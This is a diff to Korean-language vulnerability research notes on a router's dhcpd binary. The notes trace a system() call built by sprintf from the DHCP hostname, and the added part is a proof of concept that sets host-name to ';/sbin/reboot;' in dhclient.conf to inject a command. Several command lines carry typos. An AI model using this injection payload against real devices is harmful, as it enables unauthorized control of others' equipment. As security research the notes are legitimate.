@@ -24,6 +24,10 @@ exec(_)
 	  $ readelf -s 조사할프로그램 | grep system
 	  ex) readelf -s 펌웨어루트/sbin/dhcpd | grep system) <- 특정 함수를 사용한다면, 그 함수에 symbolic link를 건다  
 2. 함수에 전달되는 명령어 문자열이 동적으로 생성되는가?
+
+2-1. IDA를 이용해 dhcpd 오픈 ( MIPS littel endian)
+2-2. 코드 리뷰 (함수 윈도우에서 system 함수 검색 후 CODE XREF 클릭: SendACK)
+
 system("echo 123")
 system("echo 사용자입력값")
 
@@ -38,3 +42,14 @@ memcpy($s1, $s0)
 sprintf($s0, "echo %s %d > /var/hostname", $s1, var_38)
 // 만약 hostname = ;/sbin/reboot; 이라면 첫 ;앞은 빈문자열이므로 아무일도발생안함, 그후 reboot실행.
 system($s0)
+
+3. PoC
+3-1. uart 연결
+3-2. DHCP clinet 설정 변경
+	$ sudo vi /etc/dhcp/dhclinet.conf
+	# send host-name = gethostname(); (주석처리)
+	send host-name = ";/sbin/reboot;";
+3-3. DHCP clinet 재실행
+	$ sudo /etc/init.d/networ-manager stop
+	$ sudo kill -9  $(pidof dhclinet)
+	$ sudo dhclinet br0
